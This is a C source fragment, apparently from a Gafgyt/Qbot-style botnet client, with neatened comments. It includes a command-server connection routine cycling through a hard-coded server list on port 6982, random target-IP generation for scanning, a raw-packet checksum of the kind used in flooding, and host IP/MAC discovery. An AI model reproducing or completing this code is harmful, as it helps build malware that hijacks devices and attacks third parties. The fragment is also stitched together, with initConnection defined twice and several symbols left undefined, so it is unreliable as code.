// global variables + definitions
int mainCommSock = 0; // main comm socket, init to 0
int currentServer = -1; // index of current server, init to -1
int gotIP = 0; // flag to indicate if the IP address was obtained, init to 0
uint32_t *pids; // pointer to store PIDs
uint64_t numpids = 0; // counter for the number of PIDs
struct in_addr MyIP; // struct to store my IP
#define PHI 0x9e3779b9 // constant used for RNG
static uint32_t Q[4096]; // array used for RNG
static uint32_t c = 362436; // variable used in RNG
unsigned char macAddress[6] = {0}; // MAC address, initialized to 0

/**
 * initializes network connection
 *
 * @return status code, 0 for success, non-zero for failure
 */
int initConnection() {
    // implementation depends on specific network protocols and requirements
    return 0;
}

/**
 * generates random string of a specified length
 *
 * @param buf pointer to the buffer where the random string will be stored
 * @param length length of the random string to generate
 */
void makeRandomStr(unsigned char *buf, int length) {
    // implementation: fill 'buf' with random characters of 'length'
    // ensure that the generated string is null-terminated if it's used as a C string
}


/**
 * calculates the checksum for TCP/UDP packets
 *
 * @param iph pointer to the IP header structure
 * @param buff pointer to the buffer containing the TCP/UDP packet
 * @param data_len length of the TCP/UDP data
 * @param len Length of the buffer
 * @return calculated checksum as a 16bit unsigned integer
 */
uint16_t checksum_tcp_udp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t sum = 0;

    // add the buffer's word-wise contents to sum
    while (len > 1)
    {
        sum += *buf++;
        len -= 2;
    }

    // handle the case where the buffer's size is odd
    if (len == 1)
        sum += *((uint8_t *) buf);

    // add IP source and destination addresses to the sum
    sum += (ntohs(iph->saddr) >> 16) & 0xFFFF;
    sum += ntohs(iph->saddr) & 0xFFFF;
    sum += (ntohs(iph->daddr) >> 16) & 0xFFFF;
    sum += ntohs(iph->daddr) & 0xFFFF;

    // add the protocol and the TCP/UDP length
    sum += htons(iph->protocol) + data_len;

    // fold the sum to 16 bits and complement
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ~sum;
}
/**
 * init a pseudo-RNG
 *
 * @param x seed value for the generator
 */
void init_rand(uint32_t x)
{
    int i;

    // seed the first values
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;

    // generate pseudo-random values for the rest of the array
    for (i = 3; i < 4096; i++)
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}

/**
 * generates a random number using the CMWC (Complementary-Multiply-With-Carry) method
 *
 * @return 32bit random number
 */
uint32_t rand_cmwc(void)
{
    const uint64_t a = 18782LL;
    static uint32_t i = 4095;
    uint64_t t;
    uint32_t x;
    static uint32_t c = 362436; // move this from global to static local

    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);       // only upper 32 bits
    x = t + c;

    if (x < c) {
        x++;
        c++;
    }

    return (Q[i] = 0xfffffffe - x); // simplified r - x, where r = 0xfffffffe
}

/**
 * generates random IP address within netmask
 *
 * @param netmask netmask to use for generating IP
 * @return random IP address within the specified netmask
 */
in_addr_t findRandIP(in_addr_t netmask)
{
    in_addr_t tmp = ntohl(MyIP.s_addr) & netmask;
    return tmp ^ (rand_cmwc() & ~netmask);
}

/**
 * reads line from a file descriptor
 *
 * @param buffer buffer to store the line
 * @param bufferSize size of the buffer
 * @param fd file descriptor to read from
 * @return buffer on success, NULL on failure or EOF
 */
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
    int total = 0, bytes_read;

    while (total < bufferSize - 1) {
        bytes_read = read(fd, buffer + total, 1);
        if (bytes_read != 1) // check for EOF or error
            break;

        if (buffer[total] == '\n') // check for end of line
            break;

        total++;
    }

    buffer[total] = '\0'; // null-terminate the string
    return (bytes_read == 1) ? buffer : NULL;
}
/**
 * retrieves the machine's IP address and MAC address.
 *
 * @return 0 on failure, non-zero on success.
 */
int getMyIP()
{
    // create UDP socket
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock == -1)
        return 0; // socket creation failed

    // set up the destination server address (google's public DNS server)
    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8"); // google's DNS IP
    serv.sin_port = htons(53); // DNS port

    // connect the socket to the server
    int err = connect(sock, (const struct sockaddr *)&serv, sizeof(serv));
    if (err == -1)
        return 0; // connection failed

    // retrieve the local end of the connection (my IP address)
    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr *)&name, &namelen);
    if (err == -1)
        return 0; // Failed to get socket name

    // store my IP address
    MyIP.s_addr = name.sin_addr.s_addr;

    // open the routing table file
    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];

    // read routing table entries
    while (fdgets(linebuf, 4096, cmdline) != NULL)
    {
        // look for the default route entry
        if (strstr(linebuf, "\t00000000\t") != NULL)
        {
            // extract the interface name
            unsigned char *pos = linebuf;
            while (*pos != '\t') pos++;
            *pos = 0;
            break;
        }
        memset(linebuf, 0, 4096); // clear the buffer for the next line
    }
    close(cmdline); // close the routing table file

    // if a default route was found
    if (*linebuf)
    {
        struct ifreq ifr;
        strcpy(ifr.ifr_name, linebuf); // set the interface name

        // get MAC address of the interface
        ioctl(sock, SIOCGIFHWADDR, &ifr);
        for (int i = 0; i < 6; i++)
            macAddress[i] = ((unsigned char *)ifr.ifr_hwaddr.sa_data)[i];
    }

    close(sock); // slose the socket
    return 1; // success!
}

/**
 * calculates length of string
 *
 * @param str pointer to string
 * @return length of string
 */
int util_strlen(char *str) {
    int c = 0;
    while (*str++ != 0)  // increment counter until null character is reached
        c++;
    return c;
}

/**
 * case-insensitive string search
 *
 * @param haystack string to be searched
 * @param haystack_len length of the haystack string
 * @param str substring to search for
 * @return first occurrence of str in haystack, or -1 if not found
 */
int util_stristr(char *haystack, int haystack_len, char *str) {
    char *ptr = haystack;
    int str_len = util_strlen(str);
    int match_count = 0;

    while (haystack_len-- > 0) {
        char a = *ptr++; // current character in haystack
        char b = str[match_count]; // current character in str
        // convert both characters to lowercase
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

        if (a == b) {
            if (++match_count == str_len) // complete match found
                return (ptr - haystack);
        } else {
            match_count = 0; // reset match count if characters don't match
        }
    }

    return -1; // substring not found
}

/**
 * copies memory from source to destination
 *
 * @param dst destination pointer
 * @param src source pointer
 * @param len number of bytes to copy
 */
void util_memcpy(void *dst, void *src, int len) {
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while (len--)
        *r_dst++ = *r_src++;
}

/**
 * sopies string from source to destination
 *
 * @param dst destination string pointer
 * @param src source string pointer
 * @return length of the copied string
 */
int util_strcpy(char *dst, char *src) {
    int l = util_strlen(src);
    util_memcpy(dst, src, l + 1);
    return l;
}




/**
 * etablishes connection to the next server in the list
 * cycles through a list of servers and attempts to connect to each using a timeout
 * 
 * @return 1 on successful connection, 0 on failure.
 */
int initConnection()
{
    unsigned char server[512];
    memset(server, 0, sizeof(server)); // clear server buffer

    // close existing socket if it's open
    if (mainCommSock) { 
        close(mainCommSock); 
        mainCommSock = 0; 
    }

    // cycle through server list
    if (currentServer + 1 == SERVER_LIST_SIZE) 
        currentServer = 0;
    else 
        currentServer++;

    // copy next server address
    strcpy(server, agagag[currentServer]);

    // default port number
    int port = 6982;

    // check if a specific port is specified in the server address
    char *portPtr = strchr(server, ':');
    if (portPtr != NULL) {
        port = atoi(portPtr + 1);
        *portPtr = '\0'; // split the string at the colon to isolate the IP address
    }

    // create TCP socket
    mainCommSock = socket(AF_INET, SOCK_STREAM, 0);
    if (mainCommSock < 0) {
        perror("Socket creation failed");
        return 0;
    }

    // connect with a timeout
    if (!connectTimeout(mainCommSock, server, port, 30)) {
        close(mainCommSock); // Close the socket if the connection fails
        return 0;
    }

    return 1; // connection successful
}

